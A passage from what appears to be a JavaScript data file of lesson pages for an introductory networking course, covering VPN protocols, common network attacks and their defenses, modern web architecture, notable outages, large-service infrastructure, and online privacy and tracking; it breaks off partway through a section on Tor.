<li>Congestion window (cwnd) starts at 1 MSS and doubles each RTT (slow start), then grows linearly (congestion avoidance)</li>
<li>AIMD: increase slowly, decrease fast. Creates a sawtooth pattern that converges to fairness</li>
<li>RTO = SRTT + 4 x RTTVAR. Timeout doubles on each retry (exponential backoff)</li>
<li>Modern algorithms: Reno (fast recovery), CUBIC (cubic growth, Linux default), BBR (measures real bandwidth, no loss-based signals)</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  21: {
    titleEn: "VPN and Network Security",
    pages: [
      {
        titleEn: "What Is a VPN?",
        contentEn: `<p>A <strong>VPN</strong> (Virtual Private Network) creates an encrypted tunnel between your device and a VPN server.</p>
<h3>Without VPN:</h3>
<ul>
<li>Your traffic goes directly to the internet</li>
<li>Your ISP sees every website you visit</li>
<li>Websites see your real IP address</li>
</ul>
<h3>With VPN:</h3>
<ul>
<li>All traffic is encrypted and sent to the VPN server first</li>
<li>The VPN server forwards it to the destination</li>
<li>Your ISP sees only encrypted traffic to one IP (the VPN server)</li>
<li>Websites see the VPN server's IP, not yours</li>
</ul>
<h3>Common uses:</h3>
<ul>
<li><strong>Privacy:</strong> Hide your browsing from your ISP</li>
<li><strong>Remote work:</strong> Access company network from home securely</li>
<li><strong>Bypass restrictions:</strong> Access content blocked in your country</li>
<li><strong>Public Wi-Fi safety:</strong> Encrypt traffic on untrusted networks</li>
</ul>
<p>A VPN does <strong>not</strong> make you anonymous. The VPN provider can still see your traffic.</p>`
      },
      {
        titleEn: "IPsec — The Classic VPN Protocol",
        contentEn: `<p><strong>IPsec</strong> operates at the network layer (Layer 3). It is built into most operating systems and routers.</p>
<h3>Two protocols:</h3>
<ul>
<li><strong>ESP (Encapsulating Security Payload):</strong> Encrypts and authenticates data. Used in almost all IPsec VPNs</li>
<li><strong>AH (Authentication Header):</strong> Only authenticates, no encryption. Rarely used alone</li>
</ul>
<h3>Two modes:</h3>
<ul>
<li><strong>Tunnel mode:</strong> The entire original packet is encrypted and wrapped in a new IP header. Used for site-to-site VPNs (connect two offices)</li>
<li><strong>Transport mode:</strong> Only the payload is encrypted, the original IP header stays. Used for host-to-host communication</li>
</ul>
<h3>IKE (Internet Key Exchange):</h3>
<ul>
<li>Sets up the secure connection before data flows</li>
<li>Negotiates encryption algorithms, exchanges keys</li>
<li>Two phases: authenticate peers, then create the tunnel</li>
</ul>
<p>IPsec is powerful but complex. Configuration can be difficult. That is why simpler alternatives like WireGuard became popular.</p>`
      },
      {
        titleEn: "WireGuard — Modern and Simple",
        contentEn: `<p><strong>WireGuard</strong> is a modern VPN protocol created in 2018. It is fast, simple, and secure.</p>
<h3>Why WireGuard is different:</h3>
<ul>
<li><strong>~4,000 lines of code</strong> (IPsec has hundreds of thousands). Less code = fewer bugs</li>
<li>Uses modern cryptography only: ChaCha20, Curve25519, BLAKE2</li>
<li>No negotiation of algorithms — one fixed set. Simpler and safer</li>
<li>Runs in the Linux kernel — very fast</li>
</ul>
<h3>How it works:</h3>
<ul>
<li>Each peer has a public/private key pair (like SSH)</li>
<li>Configuration is a simple text file: your key, peer's key, allowed IPs</li>
<li>Uses UDP (not TCP) — avoids the TCP-in-TCP problem</li>
<li>Silent when idle — sends no keepalive packets unless configured</li>
</ul>
<h3>Simple config example:</h3>
<pre>[Interface]
PrivateKey = your_private_key
Address = 10.0.0.1/24

[Peer]
PublicKey = peer_public_key
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0</pre>
<p>WireGuard is now built into Linux, Android, iOS, Windows, and macOS.</p>`
      },
      {
        titleEn: "OpenVPN and Split Tunneling",
        contentEn: `<p><strong>OpenVPN</strong> is an older but very popular open-source VPN. It has been around since 2001.</p>
<h3>OpenVPN features:</h3>
<ul>
<li>Uses TLS/SSL for encryption (same as HTTPS)</li>
<li>Runs on TCP or UDP (UDP is faster, TCP works through more firewalls)</li>
<li>Works on almost every platform</li>
<li>Can run on any port — hard to block</li>
<li>Large codebase (~100,000 lines) — more complex than WireGuard</li>
</ul>
<h3>Split Tunneling</h3>
<p>Not all traffic needs to go through the VPN:</p>
<ul>
<li><strong>Full tunnel:</strong> All traffic goes through the VPN. Maximum privacy but slower</li>
<li><strong>Split tunnel:</strong> Only specific traffic goes through the VPN. The rest goes direct</li>
</ul>
<p><strong>Example split tunnel setup:</strong></p>
<ul>
<li>Work apps (email, internal tools) → through VPN</li>
<li>YouTube, Netflix, gaming → direct internet (faster)</li>
</ul>
<p><strong>Why split tunnel?</strong></p>
<ul>
<li>Saves VPN bandwidth</li>
<li>Lower latency for non-work traffic</li>
<li>Local devices (printers, smart home) stay accessible</li>
</ul>`
      },
      {
        titleEn: "Network Security Threats",
        contentEn: `<p>Networks face many types of attacks. Here are three common ones:</p>
<h3>ARP Spoofing (Man-in-the-Middle)</h3>
<ul>
<li>Attacker sends fake ARP replies on a local network</li>
<li>Tricks devices into sending traffic through the attacker's machine</li>
<li>Attacker can read, modify, or drop packets</li>
<li><strong>Defense:</strong> Use HTTPS, dynamic ARP inspection on switches, VPN</li>
</ul>
<h3>SYN Flood (Denial of Service)</h3>
<ul>
<li>Attacker sends thousands of TCP SYN packets with fake source IPs</li>
<li>Server creates half-open connections for each one, filling its memory</li>
<li>Real users cannot connect — server is too busy</li>
<li><strong>Defense:</strong> SYN cookies (server does not store state until handshake completes)</li>
</ul>
<h3>DDoS (Distributed Denial of Service)</h3>
<ul>
<li>Thousands of machines (botnet) flood a target at the same time</li>
<li>Can reach terabits per second of traffic</li>
<li>Largest attacks use DNS amplification or NTP reflection</li>
<li><strong>Defense:</strong> CDN/Cloudflare absorbs traffic, rate limiting, traffic scrubbing</li>
</ul>
<p>Security is layers. No single defense is enough. Use encryption + firewalls + monitoring together.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>A VPN creates an encrypted tunnel — hides traffic from your ISP and network</li>
<li>IPsec uses ESP (encrypt) and AH (authenticate) in tunnel mode (site-to-site) or transport mode (host-to-host)</li>
<li>WireGuard: modern, ~4,000 lines of code, fast, simple configuration with public/private keys</li>
<li>OpenVPN: older, uses TLS, works on TCP or UDP, very widely supported</li>
<li>Split tunneling sends only some traffic through the VPN — saves bandwidth and reduces latency</li>
<li>Common threats: ARP spoofing (MITM), SYN flood (exhaust server), DDoS (distributed flood)</li>
<li>Defense is layered: encryption + firewall + monitoring + CDN protection</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  22: {
    titleEn: "Modern Internet Architecture",
    pages: [
      {
        titleEn: "CDN — Content Delivery Network",
        contentEn: `<p>A <strong>CDN</strong> puts copies of content on servers close to users. Instead of one server far away, hundreds of servers worldwide.</p>
<h3>How a CDN works:</h3>
<ul>
<li><strong>Origin server:</strong> The original server with your content (your data center)</li>
<li><strong>Edge servers:</strong> CDN servers in cities around the world</li>
<li><strong>Cache:</strong> Edge servers store copies of popular content</li>
</ul>
<h3>When a user requests a page:</h3>
<ol>
<li>DNS directs the user to the nearest edge server</li>
<li>If the edge server has the content cached → serve it immediately (cache hit)</li>
<li>If not → edge server fetches from origin, caches it, then serves (cache miss)</li>
</ol>
<h3>Benefits:</h3>
<ul>
<li><strong>Speed:</strong> Content is physically closer to the user (lower latency)</li>
<li><strong>Reliability:</strong> If one edge server fails, others take over</li>
<li><strong>DDoS protection:</strong> Attack traffic is spread across many servers</li>
<li><strong>Lower origin load:</strong> Most requests never reach your server</li>
</ul>
<p><strong>Major CDNs:</strong> Cloudflare, Akamai, AWS CloudFront, Fastly. About 50% of all web traffic goes through CDNs.</p>`
      },
      {
        titleEn: "Load Balancer — L4 vs L7",
        contentEn: `<p>A <strong>load balancer</strong> distributes traffic across multiple servers. If one server fails, traffic goes to others.</p>
<h3>Layer 4 (L4) Load Balancer</h3>
<ul>
<li>Works at the transport layer (TCP/UDP)</li>
<li>Sees only IP addresses and port numbers</li>
<li>Very fast — just forwards packets without reading content</li>
<li>Cannot make decisions based on URL, cookies, or headers</li>
</ul>
<h3>Layer 7 (L7) Load Balancer</h3>
<ul>
<li>Works at the application layer (HTTP/HTTPS)</li>
<li>Reads the full request: URL, headers, cookies, body</li>
<li>Can route based on content: <code>/api</code> → API servers, <code>/images</code> → media servers</li>
<li>Can add/remove headers, rewrite URLs, terminate SSL</li>
<li>Slower than L4 but much more flexible</li>
</ul>
<h3>Common algorithms:</h3>
<ul>
<li><strong>Round robin:</strong> Each server gets requests in turn (1, 2, 3, 1, 2, 3...)</li>
<li><strong>Least connections:</strong> Send to the server with fewest active connections</li>
<li><strong>IP hash:</strong> Same client IP always goes to the same server (sticky sessions)</li>
</ul>
<p><strong>Tools:</strong> Nginx, HAProxy, AWS ALB/NLB, Google Cloud Load Balancer.</p>`
      },
      {
        titleEn: "HTTP/2 and HTTP/3 (QUIC)",
        contentEn: `<p>HTTP/1.1 (1997) has a big problem: <strong>head-of-line blocking</strong>. Only one request at a time per TCP connection.</p>
<h3>HTTP/2 (2015)</h3>
<ul>
<li><strong>Multiplexing:</strong> Many requests and responses on one TCP connection at the same time</li>
<li><strong>Binary protocol:</strong> Not text like HTTP/1.1 — faster to parse</li>
<li><strong>Header compression (HPACK):</strong> Reduces repeated header data</li>
<li><strong>Server push:</strong> Server can send files before the browser asks (CSS, JS)</li>
<li>Still uses TCP — so TCP-level head-of-line blocking remains</li>
</ul>
<h3>HTTP/3 (2022) — Built on QUIC</h3>
<ul>
<li><strong>QUIC</strong> runs on UDP instead of TCP</li>
<li>Each stream is independent — one lost packet does not block others</li>
<li><strong>0-RTT connection:</strong> Returning visitors can send data immediately (no handshake delay)</li>
<li>Built-in encryption (TLS 1.3) — always encrypted, no option to disable</li>
<li>Connection migration: Switch from Wi-Fi to cellular without dropping the connection</li>
</ul>
<p>About 30% of web traffic uses HTTP/3 today. Google, Facebook, and Cloudflare are major adopters.</p>`
      },
      {
        titleEn: "REST API and WebSockets",
        contentEn: `<p>Modern web apps need to communicate between frontend and backend. Two main patterns:</p>
<h3>REST API</h3>
<ul>
<li>Uses standard HTTP methods: GET (read), POST (create), PUT (update), DELETE (remove)</li>
<li><strong>Stateless:</strong> Each request contains all information needed. Server does not remember previous requests</li>
<li>Data format: usually JSON</li>
<li>Example: <code>GET /api/users/42</code> returns user with ID 42</li>
</ul>
<p><strong>REST is great for:</strong> CRUD operations, mobile apps, third-party integrations.</p>
<h3>WebSockets</h3>
<ul>
<li>Starts as an HTTP request, then <strong>upgrades</strong> to a persistent two-way connection</li>
<li>Both client and server can send messages at any time</li>
<li>No need to poll — server pushes updates instantly</li>
</ul>
<p><strong>WebSockets are great for:</strong> Chat apps, live stock prices, multiplayer games, real-time dashboards.</p>
<h3>When to use which:</h3>
<ul>
<li>Need to fetch data once? → REST</li>
<li>Need real-time updates pushed to the client? → WebSocket</li>
<li>Many apps use both: REST for regular operations + WebSocket for live updates</li>
</ul>`
      },
      {
        titleEn: "Microservices and Service Mesh",
        contentEn: `<p>Traditional apps are <strong>monoliths</strong>: one big program that does everything. Microservices split the app into small, independent services.</p>
<h3>Microservices:</h3>
<ul>
<li>Each service does one thing: auth service, payment service, email service</li>
<li>Services communicate over the network (HTTP, gRPC, message queues)</li>
<li>Each service can be deployed, scaled, and updated independently</li>
<li>Different services can use different programming languages</li>
</ul>
<h3>Challenges:</h3>
<ul>
<li>Many network calls between services — latency adds up</li>
<li>Hard to debug: a request may touch 10 services</li>
<li>Need service discovery: how does Service A find Service B?</li>
<li>Need to handle failures: what if one service is down?</li>
</ul>
<h3>Service Mesh (Istio, Linkerd)</h3>
<ul>
<li>A dedicated infrastructure layer for service-to-service communication</li>
<li>Each service gets a <strong>sidecar proxy</strong> (like Envoy) that handles networking</li>
<li>The mesh provides: load balancing, encryption (mTLS), retries, timeouts, observability</li>
<li>Developers write business logic. The mesh handles networking</li>
</ul>
<p><strong>Result:</strong> Every service-to-service call is encrypted, monitored, and resilient — without changing application code.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>CDNs place content on edge servers worldwide — faster delivery, DDoS protection, lower origin load</li>
<li>L4 load balancers forward packets by IP/port (fast). L7 load balancers read HTTP content (flexible)</li>
<li>HTTP/2: multiplexing on one TCP connection. HTTP/3 (QUIC): UDP-based, 0-RTT, no head-of-line blocking</li>
<li>REST: stateless HTTP requests (GET/POST/PUT/DELETE). WebSockets: persistent two-way real-time connection</li>
<li>Microservices split apps into small services. Service mesh (Istio/Linkerd) handles networking between them with sidecar proxies</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  23: {
    titleEn: "Failures and Recovery",
    pages: [
      {
        titleEn: "Facebook Outage — October 2021",
        contentEn: `<p>On October 4, 2021, Facebook, Instagram, and WhatsApp went down for <strong>6 hours</strong>. 3.5 billion users were affected.</p>
<h3>What happened:</h3>
<ol>
<li>A routine maintenance command was issued to check BGP router capacity</li>
<li>The command had a bug — it withdrew all BGP route announcements</li>
<li>Every Facebook server disappeared from the internet in seconds</li>
<li>DNS servers for facebook.com became unreachable</li>
<li>The cascading failure also took down internal tools</li>
</ol>
<h3>Why recovery took 6 hours:</h3>
<ul>
<li>Engineers could not access internal systems (they were down too)</li>
<li>Remote access tools depended on Facebook's own network</li>
<li>Physical access to data centers required badge systems — also down</li>
<li>Engineers had to physically go to data centers and manually fix routers</li>
</ul>
<h3>Lessons:</h3>
<ul>
<li>Do not depend on your own network for recovery tools</li>
<li>Out-of-band management access is critical (a separate path that works when everything else is down)</li>
<li>Test disaster recovery procedures regularly</li>
<li>One bad command can take down a global service</li>
</ul>
<p>Estimated cost: over $100 million in lost revenue.</p>`
      },
      {
        titleEn: "SQL Slammer — 376 Bytes That Shook the Internet",
        contentEn: `<p>On January 25, 2003, a worm called <strong>SQL Slammer</strong> spread across the internet in <strong>10 minutes</strong>.</p>
<h3>How it worked:</h3>
<ul>
<li>Exploited a known vulnerability in Microsoft SQL Server (patch was available for 6 months)</li>
<li>The entire worm fit in <strong>one UDP packet — 376 bytes</strong></li>
<li>No file was written to disk. It lived only in memory</li>
<li>Each infected server scanned random IPs and sent the worm to them</li>
<li>Exponential spread: doubled every 8.5 seconds</li>
</ul>
<h3>Impact:</h3>
<ul>
<li>75,000 servers infected in 10 minutes</li>
<li>South Korea lost most of its internet for hours</li>
<li>ATMs, airline systems, and 911 services went down in the US</li>
<li>Internet backbone routers were overloaded with scanning traffic</li>
</ul>
<h3>Lessons:</h3>
<ul>
<li><strong>Patch your systems.</strong> The fix existed 6 months before the attack</li>
<li>One tiny packet can cause massive damage</li>
<li>UDP-based attacks spread faster than TCP (no handshake needed)</li>
<li>Internet infrastructure is more fragile than we think</li>
</ul>`
      },
      {
        titleEn: "BGP Hijacking and Route Leaks",
        contentEn: `<p>BGP (Border Gateway Protocol) is how internet providers share routing information. It is based on <strong>trust</strong> — and that is a problem.</p>
<h3>BGP Hijacking:</h3>
<ul>
<li>Any network can announce: "I own IP range 1.2.3.0/24"</li>
<li>BGP has <strong>no built-in authentication</strong> — routers believe the announcement</li>
<li>An attacker can redirect traffic meant for another network to their own</li>
</ul>
<h3>Famous incidents:</h3>
<ul>
<li><strong>2008 — Pakistan/YouTube:</strong> Pakistan Telecom tried to block YouTube locally but accidentally announced YouTube's IP range to the world. YouTube was unreachable globally for 2 hours</li>
<li><strong>2018 — Crypto theft:</strong> Attackers hijacked Amazon DNS server IPs, redirected crypto wallet users, stole $150,000</li>
<li><strong>2019 — China Telecom:</strong> Accidentally rerouted European traffic through China for 2 hours</li>
</ul>
<h3>Why is this still possible?</h3>
<ul>
<li>BGP was designed in 1989, when the internet was small and trusted</li>
<li><strong>RPKI</strong> (Resource Public Key Infrastructure) is the fix — cryptographic signing of route announcements</li>
<li>Adoption is slow: about 40% of routes are RPKI-protected (2024)</li>
</ul>`
      },
      {
        titleEn: "Blameless Postmortem Culture",
        contentEn: `<p>When systems fail, the natural response is: "Who made the mistake?" But blame makes things worse.</p>
<h3>Blameless Postmortem:</h3>
<ul>
<li>Focus on <strong>what</strong> happened and <strong>why</strong>, not <strong>who</strong></li>
<li>The person who made the error often has the best information about what went wrong</li>
<li>If people fear punishment, they hide mistakes. Hidden mistakes become bigger failures</li>
</ul>
<h3>Structure of a good postmortem:</h3>
<ol>
<li><strong>Timeline:</strong> Exact sequence of events with timestamps</li>
<li><strong>Impact:</strong> How many users affected, for how long, revenue lost</li>
<li><strong>Root cause:</strong> The real underlying reason (not "human error")</li>
<li><strong>What went well:</strong> Things that helped during recovery</li>
<li><strong>Action items:</strong> Concrete changes to prevent recurrence</li>
</ol>
<h3>Key principle:</h3>
<p>"The system allowed this failure to happen. Fix the system, not the person."</p>
<ul>
<li>If one command can take down production, the problem is missing safeguards</li>
<li>Add confirmation prompts, canary deployments, automated rollbacks</li>
<li>Google, Netflix, and Etsy publish their postmortems publicly — transparency builds trust</li>
</ul>`
      },
      {
        titleEn: "Chaos Engineering — Breaking Things on Purpose",
        contentEn: `<p>If you do not test failures, you will not be ready when real failures happen. <strong>Chaos engineering</strong> means breaking your system on purpose to find weaknesses.</p>
<h3>Netflix Chaos Monkey (2011):</h3>
<ul>
<li>Randomly kills virtual machines in production during work hours</li>
<li>Forces engineers to build services that survive server failures</li>
<li>If a service cannot handle a lost server, they find out before users do</li>
</ul>
<h3>Netflix Simian Army (expanded tools):</h3>
<ul>
<li><strong>Chaos Monkey:</strong> Kills random instances</li>
<li><strong>Chaos Kong:</strong> Simulates an entire AWS region going down</li>
<li><strong>Latency Monkey:</strong> Adds artificial delays to network calls</li>
</ul>
<h3>Principles of chaos engineering:</h3>
<ol>
<li><strong>Start with a hypothesis:</strong> "If server X dies, users should not notice"</li>
<li><strong>Run in production:</strong> Staging environments do not show real problems</li>
<li><strong>Minimize blast radius:</strong> Start small (one server), expand gradually</li>
<li><strong>Automate:</strong> Run chaos experiments continuously, not just once</li>
</ol>
<p><strong>Other tools:</strong> Gremlin, LitmusChaos, AWS Fault Injection Service.</p>
<p>Companies that practice chaos engineering have fewer and shorter outages. You cannot prevent all failures, but you can be ready for them.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>Facebook 2021: one bad BGP command took down 3.5 billion users for 6 hours. Recovery tools depended on the broken network</li>
<li>SQL Slammer (2003): 376-byte worm infected 75,000 servers in 10 minutes using an unpatched vulnerability</li>
<li>BGP has no authentication — anyone can announce any route. RPKI adds cryptographic verification but adoption is slow</li>
<li>Blameless postmortems focus on fixing systems, not blaming people. Timeline, root cause, and action items</li>
<li>Chaos engineering (Netflix Chaos Monkey) breaks systems on purpose to find weaknesses before real failures happen</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  24: {
    titleEn: "Behind the Scenes — How Big Services Work",
    pages: [
      {
        titleEn: "Netflix Open Connect",
        contentEn: `<p>Netflix is about 15% of all internet traffic worldwide. How do they deliver so much video without breaking the internet?</p>
<h3>Open Connect Appliances (OCA):</h3>
<ul>
<li>Netflix builds custom servers and places them <strong>inside ISPs</strong></li>
<li>Over 17,000 OCA servers in 6,000+ locations worldwide</li>
<li>Each OCA can serve 100+ Gbps of video</li>
<li>The ISP hosts them for free — it saves the ISP money on external bandwidth</li>
</ul>
<h3>How it works:</h3>
<ol>
<li>At night (off-peak), Netflix fills OCAs with popular content for the region</li>
<li>When you press play, DNS routes you to the nearest OCA</li>
<li>Your video streams from a server inside your own ISP's network</li>
<li>The data never crosses the internet backbone — it is already local</li>
</ol>
<h3>Why this is smart:</h3>
<ul>
<li>Lower latency — the server is in your city, maybe your building</li>
<li>No buffering even during peak hours</li>
<li>ISP saves on transit costs (does not pay to receive Netflix traffic)</li>
<li>Netflix saves on CDN costs (does not pay Akamai or Cloudflare)</li>
</ul>
<p>Netflix is its own CDN. Open Connect is one of the largest content delivery networks in the world.</p>`
      },
      {
        titleEn: "WhatsApp — 50 Engineers, 2 Billion Users",
        contentEn: `<p>When Facebook bought WhatsApp in 2014 for $19 billion, it had <strong>50 engineers</strong> serving 450 million users.</p>
<h3>The secret: Erlang</h3>
<ul>
<li>WhatsApp's backend is written in <strong>Erlang</strong>, a language designed for telecom systems</li>
<li>Erlang was built for millions of concurrent connections</li>
<li>Each user session is a lightweight Erlang process (not a thread)</li>
<li>One server can handle <strong>2 million connections</strong></li>
</ul>
<h3>Architecture choices:</h3>
<ul>
<li><strong>No complex microservices:</strong> Simple, focused architecture</li>
<li><strong>Messages stored only until delivered:</strong> No long-term message storage (at that time)</li>
<li><strong>End-to-end encryption:</strong> Servers cannot read messages</li>
<li><strong>No ads, no tracking:</strong> Less infrastructure needed for analytics</li>
</ul>
<h3>Scaling lessons:</h3>
<ul>
<li>Choose the right tool: Erlang was perfect for this workload</li>
<li>Keep it simple: Fewer features = fewer servers needed</li>
<li>Optimize per connection: 2M connections per server is extraordinary</li>
</ul>
<p>Today WhatsApp serves 2+ billion users. The engineering team is still small compared to the user base.</p>`
      },
      {
        titleEn: "Google B4 — Private Software-Defined WAN",
        contentEn: `<p>Google has data centers on every continent. They need to move huge amounts of data between them. Public internet is not good enough.</p>
<h3>B4 — Google's private WAN:</h3>
<ul>
<li>A <strong>private network</strong> connecting all Google data centers</li>
<li>Uses <strong>SDN (Software-Defined Networking)</strong> — a central controller decides all routing</li>
<li>Traditional routers make independent decisions. B4's controller sees the whole network</li>
</ul>
<h3>How B4 optimizes:</h3>
<ul>
<li>Knows all traffic demands in advance (backup jobs, replication, search index updates)</li>
<li>Schedules traffic to fill links to nearly <strong>100% capacity</strong> (normal networks aim for 30-40%)</li>
<li>Prioritizes: user-facing traffic > replication > batch jobs</li>
<li>Reroutes traffic in seconds when a link fails</li>
</ul>
<h3>Why SDN works here:</h3>
<ul>
<li>Google controls both endpoints — no need to negotiate with other networks</li>
<li>Traffic is predictable (internal, not random user traffic)</li>
<li>Central control + global view = much better optimization than distributed routing</li>
</ul>
<p>B4 was one of the first large-scale SDN deployments. It proved that SDN works in production at massive scale.</p>`
      },
      {
        titleEn: "Submarine Cables — 99% of International Data",
        contentEn: `<p><strong>99% of international data</strong> travels through cables on the ocean floor. Not satellites.</p>
<h3>Key facts:</h3>
<ul>
<li>Over 550 submarine cables worldwide, total length 1.4 million km</li>
<li>Cables are about the thickness of a garden hose (with armor)</li>
<li>They contain fiber optic strands — data travels as light pulses</li>
<li>One modern cable can carry 250+ Tbps (terabits per second)</li>
<li>Cables last about 25 years</li>
</ul>
<h3>Who owns them?</h3>
<ul>
<li>Historically: telecom companies (like AT&T, NTT)</li>
<li>Today: Google, Meta, Microsoft, and Amazon are the biggest investors</li>
<li>Google alone owns or co-owns 20+ submarine cables</li>
</ul>
<h3>Risks:</h3>
<ul>
<li><strong>Anchors and fishing:</strong> Cause about 70% of cable damage</li>
<li><strong>Earthquakes:</strong> Can break multiple cables at once (like Taiwan 2006)</li>
<li><strong>Sharks:</strong> Occasionally bite cables (Google added Kevlar protection)</li>
<li><strong>Sabotage:</strong> Cutting cables can isolate entire countries</li>
</ul>
<p>Repair ships take days to weeks to fix a broken cable. Redundancy (multiple cables on different paths) is the main protection.</p>`
      },
      {
        titleEn: "Cloudflare — 300+ Points of Presence",
        contentEn: `<p><strong>Cloudflare</strong> is one of the largest networks in the world, operating in 300+ cities across 100+ countries.</p>
<h3>What Cloudflare does:</h3>
<ul>
<li><strong>CDN:</strong> Caches and delivers website content from edge servers</li>
<li><strong>DDoS protection:</strong> Absorbs massive attacks (has handled 71 million requests/second)</li>
<li><strong>DNS:</strong> Runs 1.1.1.1, one of the fastest public DNS resolvers</li>
<li><strong>Zero Trust:</strong> Replaces VPN for enterprise access</li>
<li><strong>Workers:</strong> Run code at the edge (serverless on 300+ locations)</li>
</ul>
<h3>Anycast architecture:</h3>
<ul>
<li>Every Cloudflare data center announces the <strong>same IP addresses</strong></li>
<li>BGP routes users to the nearest data center automatically</li>
<li>If one location goes down, traffic flows to the next nearest</li>
<li>No single point of failure</li>
</ul>
<h3>Scale:</h3>
<ul>
<li>Handles about 20% of all web traffic</li>
<li>Protects over 30 million websites</li>
<li>Capacity: 248+ Tbps — larger than any recorded DDoS attack</li>
</ul>
<p>Cloudflare is an example of the "edge computing" model: instead of centralizing in a few big data centers, spread compute everywhere.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>Netflix Open Connect: 17,000+ custom servers inside ISPs. Your video comes from your own ISP's network</li>
<li>WhatsApp: Erlang handles 2M connections per server. 50 engineers served 450M users. Right tool for the job</li>
<li>Google B4: Private SDN WAN between data centers, runs links at ~100% capacity with central traffic engineering</li>
<li>Submarine cables carry 99% of international data. Over 550 cables, 1.4 million km, increasingly owned by tech giants</li>
<li>Cloudflare: 300+ locations, anycast routing, 20% of web traffic. CDN + DDoS + DNS + edge compute in one network</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  25: {
    titleEn: "Privacy and Tracking on the Internet",
    pages: [
      {
        titleEn: "What Your ISP Can See",
        contentEn: `<p>Your ISP (Internet Service Provider) is the first hop for all your traffic. What can they see?</p>
<h3>Without encryption:</h3>
<ul>
<li>Everything: URLs, content, search queries, emails</li>
<li>This is rare today — most sites use HTTPS</li>
</ul>
<h3>With HTTPS (most traffic today):</h3>
<ul>
<li><strong>DNS queries:</strong> Your ISP sees every domain you look up (unless you use DoH/DoT)</li>
<li><strong>SNI (Server Name Indication):</strong> When your browser starts a TLS connection, it sends the domain name in plain text</li>
<li><strong>IP addresses:</strong> Your ISP sees which server IPs you connect to</li>
<li><strong>Traffic volume and timing:</strong> When you connect, how much data, how long</li>
</ul>
<h3>What HTTPS hides:</h3>
<ul>
<li>The actual content: page text, images, form data</li>
<li>The specific URL path (only the domain is visible, not <code>/search?q=cats</code>)</li>
</ul>
<h3>ECH (Encrypted Client Hello):</h3>
<ul>
<li>New technology that encrypts SNI too</li>
<li>With DoH + ECH, your ISP sees only the IP address you connect to</li>
<li>Still in early adoption (Cloudflare supports it)</li>
</ul>
<p>In many countries, ISPs are required by law to log your connections. A VPN moves this visibility from your ISP to the VPN provider.</p>`
      },
      {
        titleEn: "Browser Fingerprinting",
        contentEn: `<p>Even without cookies, websites can identify you using <strong>browser fingerprinting</strong>. Your browser reveals a lot of unique information.</p>
<h3>What makes your fingerprint:</h3>
<ul>
<li><strong>Canvas fingerprinting:</strong> Drawing an invisible image. Each device renders it slightly differently due to GPU, drivers, fonts</li>
<li><strong>Installed fonts:</strong> The list of fonts on your system is surprisingly unique</li>
<li><strong>Screen resolution and color depth</strong></li>
<li><strong>Browser plugins and extensions</strong></li>
<li><strong>Time zone and language settings</strong></li>
<li><strong>WebGL renderer:</strong> Reveals your exact GPU model</li>
<li><strong>Audio fingerprinting:</strong> Processing an audio signal — each device produces a slightly different output</li>
</ul>
<h3>How unique is your fingerprint?</h3>
<ul>
<li>Studies show 80-95% of browsers have a unique combination</li>
<li>Even in "private browsing" mode, your fingerprint stays the same</li>
<li>Changing one thing (like user agent) can make you MORE unique</li>
</ul>
<h3>Protection:</h3>
<ul>
<li>Brave and Firefox block known fingerprinting scripts</li>
<li>Tor Browser makes all users look the same (same window size, fonts, etc.)</li>
<li>There is no perfect solution — it is a cat-and-mouse game</li>
</ul>`
      },
      {
        titleEn: "How Google and Meta Track You",
        contentEn: `<p>The biggest trackers on the internet are advertising companies. Google and Meta (Facebook) track you across millions of websites.</p>
<h3>Tracking Pixels:</h3>
<ul>
<li>A 1x1 invisible image loaded from the tracker's server</li>
<li>When your browser loads it, the tracker gets: your IP, cookies, referrer page, time</li>
<li>Facebook Pixel is on millions of websites — it sees your browsing even when you are not on Facebook</li>
</ul>
<h3>Third-Party Cookies:</h3>
<ul>
<li>A cookie set by a domain different from the one you are visiting</li>
<li>Example: You visit news.com, but Google Ads sets a cookie. You visit shop.com, and Google Ads reads the same cookie. Now Google knows you visited both sites</li>
<li><strong>Dying technology:</strong> Safari and Firefox block third-party cookies. Chrome is phasing them out</li>
</ul>
<h3>What they build:</h3>
<ul>
<li>A detailed profile: interests, purchases, location history, relationships</li>
<li>Google sees you on: Search, YouTube, Gmail, Maps, Android, Google Ads on other sites</li>
<li>Meta sees you on: Facebook, Instagram, WhatsApp, Meta Pixel on other sites</li>
</ul>
<h3>Replacements for cookies:</h3>
<ul>
<li>Google Topics API: Browser categorizes your interests locally, shares only topics</li>
<li>First-party data: Websites collect data directly from logged-in users</li>
</ul>`
      },
      {
        titleEn: "Tor — Onion Routing",
        contentEn: `<p><strong>Tor</strong> (The Onion Router) provides strong anonymity by routing traffic through <strong>three random nodes</strong>.</p>
<h3>How Tor works:</h3>
<ol>
<li><strong>Guard node (entry):</strong> Knows your real IP, but not your destination</li>
<li><strong>Middle node (relay):</strong> Knows neither your IP nor your destination</li>
<li><strong>Exit node:</strong> Knows the destination, but not your real IP</li>
</ol>
<p>Each layer of encryption is removed at each node — like peeling an onion. No single node knows the full picture.</p>
<h3>Tor provides:</h3>
<ul>
<li><strong>Anonymity:</strong> The destination cannot find your real IP</li>
<li><strong>Censorship resistance:</strong> Hard to block (bridges, pluggable transports)</li>
<li><strong>.onion sites:</strong> Hidden services that exist only within the Tor network</li>
</ul>
<h3>Limitations:</h3>
